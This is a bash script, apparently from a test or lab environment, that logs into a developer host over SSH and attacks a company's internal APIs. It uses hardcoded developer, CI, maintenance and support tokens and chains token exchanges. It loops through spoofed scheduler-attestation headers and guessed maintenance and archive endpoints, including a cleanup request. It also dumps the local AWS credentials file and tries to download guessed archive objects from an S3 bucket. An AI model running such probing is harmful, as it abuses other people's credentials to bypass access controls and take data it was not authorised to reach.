set +e
ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 rowan-dev 'bash -s' <<'RSH'
set +e
CA=$HOME/.local/share/keplerops/ca.crt
B=https://cloud-api.keplerops.test
U="rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo"
WT=$(curl -sSk -m 10 -u "$U" -X POST -H 'Content-Type: application/json' -d '{}' "$B/api/workspaces/current/token-exchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
EJ=$(curl -sSk -m 10 -X POST -H "Authorization: Bearer $WT" -H 'Content-Type: application/json' -d '{}' "$B/api/token-exchange/fieldkest-export-access" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
RC="fk_maintenance_runtime_3gIP3j8w6fhkBSqv7J5xllOrDVa2Kzig"
WC="fk_ci_maintenance_nU7V3DOnq7kpyAwp46cV50mO8fqtxHSJ"
g(){ n="$1"; shift; echo "##### $n"; curl -sSk -m 10 --cacert $CA -w '\n[%{http_code}]\n' "$@" | head -c 1600; echo; }
echo "########## MAINTENANCE HEADER MATRIX"
for AT in "$EJ" "$WC" "$RC" "scheduler" "fieldkest-scheduler" ""; do
 for WL in maintenance "" ; do
  H1=(); [ -n "$AT" ] && H1+=(-H "X-Scheduler-Attestation: $AT"); [ -n "$WL" ] && H1+=(-H "X-Workload-Class: $WL")
  g "GET /api/maintenance AT=${AT:0:10} WL=$WL" -H "Authorization: Bearer $EJ" "${H1[@]}" "$B/api/maintenance"
 done
done
echo "########## WITH WORKER CRED AUTH"
for extra in "archive=FIELD-CRR-2026-09" "workload_class=maintenance" "command=maintenance-summary"; do
 g "GET /api/maintenance?$extra" -H "Authorization: Bearer $EJ" -H "X-Workload-Class: maintenance" -H "X-Scheduler-Attestation: $WC" "$B/api/maintenance?$extra"
done
echo "########## ALT PATHS"
for p in "api/maintenance/FIELD-CRR-2026-09" "api/maintenance/archive/FIELD-CRR-2026-09" "api/archives/FIELD-CRR-2026-09" "api/archive/FIELD-CRR-2026-09" "api/archive/CRR-OG2" "api/assets/CRR-OG2" "api/support/data" "api/support/export" "api/support/exports"; do
 g "GET $p" -H "Authorization: Bearer $EJ" -H "X-Workload-Class: maintenance" -H "X-Scheduler-Attestation: $WC" "$B/$p"
done
echo "########## POST MAINTENANCE"
for body in '{"command":"maintenance-summary","archive":"FIELD-CRR-2026-09"}' '{"archive":"FIELD-CRR-2026-09"}' '{"cleanup":true,"archive":"FIELD-CRR-2026-09"}' '{"action":"maintenance-summary","args":["--archive","FIELD-CRR-2026-09"]}'; do
 g "POST /api/maintenance $body" -X POST -H "Authorization: Bearer $EJ" -H "X-Workload-Class: maintenance" -H "X-Scheduler-Attestation: $WC" -H 'Content-Type: application/json' -d "$body" "$B/api/maintenance"
done
echo "########## SUPPORT SERVICE ARCHIVE PROBES (support token)"
ST="fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b"
for p in "api/handovers/current" "api/exports" "api/exports/EXP-2841" "api/archive/FIELD-CRR-2026-09" "api/archives/FIELD-CRR-2026-09" "api/archive/CRR-OG2" "api/assets/CRR-OG2" "api/support/export"; do
 g "SUP $p" -H "Authorization: Bearer $ST" "https://support.keplerops.test:8443/$p"
done
echo "########## AWS IDENTITY / S3 KEYS"
echo "-- creds"; cat ~/.aws/credentials 2>/dev/null; echo; cat ~/.aws/config 2>/dev/null
aws --endpoint-url https://objects.keplerops.test --no-verify-ssl sts get-caller-identity 2>&1 | head -20
for k in "EXP-2841/collection.json" "exp-2841/collection.json" "exports/EXP-2841/collection.json" "EXP-2841-rowan/collection.json" "EXP-2841-rowan/PART-ARWC-01-rev10.json" "archive/FIELD-CRR-2026-09/CRR-OG2.json" "FIELD-CRR-2026-09/CRR-OG2.json" "archive/CRR-OG2.json" "CRR-OG2.json"; do
 echo "-- $k"; aws --endpoint-url https://objects.keplerops.test --no-verify-ssl s3 cp "s3://fieldkest-exports/$k" - 2>&1 | head -c 300; echo
done
echo DONE_R28
RSH
echo FINISHED
